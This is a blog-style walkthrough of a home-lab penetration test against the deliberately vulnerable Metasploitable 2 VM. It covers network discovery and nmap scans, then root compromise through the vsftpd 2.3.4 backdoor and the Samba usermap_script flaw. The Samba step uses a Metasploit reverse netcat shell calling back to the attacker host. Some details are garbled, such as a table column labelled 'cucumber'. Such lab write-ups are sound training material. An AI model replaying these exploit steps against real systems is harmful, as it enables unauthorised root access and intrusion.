
## **Stage 1: Discovery of live devices on the network (Active Hosts Discovery) :**

### Used: netdiscover :

```plaintext
┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
└─$ sudo netdiscover -r 192.168.84.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                     
                                                                                                                                                                   
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.84.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                    
 192.168.84.2    00:50:56:e2:e0:18      1      60  VMware, Inc.                                                                                                    
 192.168.84.133  00:0c:29:2b:f8:0e      1      60  VMware, Inc.                                                                                                    
 192.168.84.254  00:50:56:f9:b5:05      1      60  VMware, Inc.
```

### **Scan the entire network to identify live devices (Ping Sweep) :**

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752681689816/8e547ca2-8082-4da8-bd61-55fc88bc1c6c.png" alt="" align="center" fullwidth="true" />

* -sn: Scan without port detection (Ping Scan only) 192.168.84.0/24 : Scan the entire Class C network (256 IP addresses)

* 5 live devices confirmed :

  ```plaintext
   
  192.168.84.1

  192.168.84.2

  192.168.84.133 => Target Machine

  192.168.84.254

  192.168.84.131  => My IP (Attack Machine)
  ```

  * Device `192.168.84.133` appears in both netdiscover and nmap, which makes it likely the target device.

### **Scan for open services and ports on the target :**

1 - Using Nmap to Detect Firewall

* TCP ACK Scan :

  `-sA`: Checks the ACK type to see if the firewall allows or blocks responses.

  * If Result:

    * If filtered appears, there is most likely a firewall.

    * If unfiltered appears, there is most likely no clear filtering.

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752682360586/bd8b0955-62b1-4aa8-bb2a-79a787fe5231.png" alt="" align="center" fullwidth="true" />

* The target device responds to ACK packets with a Reset (RST) response.

* This indicates that the ports are not protected by a firewall that silences or filters packets.

* A RST response means that the packets are passing through normally.

✅ Conclusion:

* There is no active firewall blocking ACK scanning on this device (192.168.84.131). The ports are handling packets normally, indicating a device open to network scanning without strong security.

### Since the device is responding to the ACK check, you can now use:

```plaintext
┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
└─$ nmap -p- -sV -T5 -O 192.168.84.133 | tee Metasploitable2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 12:17 EDT
Nmap scan report for 192.168.84.133
Host is up (0.0021s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
42491/tcp open  java-rmi    GNU Classpath grmiregistry
54231/tcp open  status      1 (RPC #100024)
55027/tcp open  nlockmgr    1-4 (RPC #100021)
60675/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:2B:F8:0E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.43 seconds
```

🔍 Command Explanation:

| **cucumber**                | **Meaning**                                                                |
| --------------------------- | -------------------------------------------------------------------------- |
| `-p-`                       | Scan all ports (1 to 65535)                                                |
| `-sV`                       | Trying to discover the version of each service running on the open port    |
| `-T5`                       | Aggressive Timing — used in test environments                              |
| `-O`                        | OS Detection                                                               |
| `tee` `Metasploitable2.txt` | To save the results to a file at the same time they appear in the terminal |

### Let's take each open port and work step by step to analyze each port and see if there is a loophole that we can exploit or not ":

* ### First Port 21 FTP => (vsftpd 2.3.4)

```plaintext
21/tcp   open  ftp         vsftpd 2.3.4
```

* Search in [exploit-db.com](http://exploit-db.com) :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752684478065/e2bc402a-a796-420e-9850-ba55adc5c727.png" alt="" align="center" fullwidth="true" />

* **vsftpd 2.3.4 - Backdoor Command Execution .**

* **vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)**

  Exploiting the vulnerability using Metasploit :

* open Metasploit :

  ```plaintext
  ┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
  └─$ msfconsole
  ```

We will use Backdoor Command Execution :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752684991549/f2bf9c80-7811-40b9-9a03-14f12149c676.png" alt="" align="center" fullwidth="true" />

Setting options

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752685996656/23d76192-38fd-47ed-a6da-88735211d681.png" alt="" align="center" fullwidth="true" />

Implementation of exploitation :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752686149318/5726e43c-7e0f-4d35-b91d-e344308af042.png" alt="" align="center" fullwidth="true" />

Change the root password :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752686503475/a06dd604-3b91-41ce-add4-e0a12ee6f7ec.png" alt="" align="center" fullwidth="true" />

Try logging in machine using root username and password :

```plaintext
username : root
pass : AS-2
```

Done “))

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1752686755579/28d431e3-16b4-4116-b62f-43878c129ab5.png" alt="" align="center" fullwidth="true" />

* ## secondly netbios-ssn Port 139 And 445 Samba => (smbd 3.X - 4.X) :

Exploiting a Samba 3.0.20 vulnerability to obtain a root shell via SMB on ports 139/445 :

1- Check the system and determine the Samba version :

```plaintext
┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
└─$ nmap -p 139,445 --script smb-os-discovery 192.168.84.133
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 17:38 EDT
Nmap scan report for 192.168.84.133
Host is up (0.0028s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:2B:F8:0E (VMware)

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-07-16T13:50:23-04:00

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
```

Result: OS: Unix (`Samba 3.0.20-Debian`) Computer name: `metasploitable`

2- Search for appropriate vulnerabilities for the Samba version :

```plaintext
┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
└─$ searchsploit Samba 3.0.20-Debian
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                     | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The important thing here: `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)`

3- Search for exploits within Metasploit :

* open : `msfconsole`

```plaintext
┌──(as㉿AAS)-[~/Labs/Metasploitable-2]
└─$ msfconsole
```

* search : `search type:exploit Samba 3.0.20`

  ```plaintext
  msf6 > search type:exploit Samba 3.0.20

  Matching Modules
  ================

     #  Name                                Disclosure Date  Rank       Check  Description
     -  ----                                ---------------  ----       -----  -----------
     0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


  Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

  msf6 >
  ```

* Then => `use 0` Then => `show options`

  ```plaintext

  msf6 > use 0
  [*] No payload configured, defaulting to cmd/unix/reverse_netcat
  msf6 exploit(multi/samba/usermap_script) > show options 

  Module options (exploit/multi/samba/usermap_script):

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     CHOST                     no        The local client address
     CPORT                     no        The local client port
     Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
     RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
     RPORT    139              yes       The target port (TCP)


  Payload options (cmd/unix/reverse_netcat):

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  192.168.84.131   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port


  Exploit target:

     Id  Name
     --  ----
     0   Automatic



  View the full module info with the info, or info -d command.

  msf6 exploit(multi/samba/usermap_script) >
  ```

4- Setting options within the exploit :

```plaintext

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.84.133
RHOSTS => 192.168.84.133
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.84.131
LHOST => 192.168.84.131
msf6 exploit(multi/samba/usermap_script) > exploit
```

* ✅ LHOST is the Kali Linux address

* ✅ RHOSTS is the Metasploitable 2 address

* ✅ RPORT is automatically set to 139

5 - Implementing the exploitation :

```plaintext
msf6 exploit(multi/samba/usermap_script) > exploit 
[*] Started reverse TCP handler on 192.168.84.131:4444 
[*] Command shell session 1 opened (192.168.84.131:4444 -> 192.168.84.133:59445) at 2025-07-16 18:03:58 -0400

id
uid=0(root) gid=0(root)

whoami
root
```

> Quick Technical Summary: CVE: CVE-2007-2447 :

* `Service: Samba SMB (netbios-ssn)`

* `Ports: 139 and 445`

* `Exploit Type: Remote Command Execution`

* `Module: exploit/multi/samba/usermap_script`

* `Result: Full shell as root`

> ***💬 "Control*** ***the code, and you control the world." 🔐 From wiping metadata to gaining root access — every step is documented and my goal is to deeply understand the system, not just hack!***
>
> [***Abdelwahab Shandy***](https://abdelwahabshandy.hashnode.dev/)
>
> [***Linkedin***](https://www.linkedin.com/in/abdelwahab-ahmed-shandy/)
>
> [***GitHub***](https://github.com/abdelwahab-ahmed-shandy)
>
> ***See You Soon***
>
> ***AS Cyber “)).***

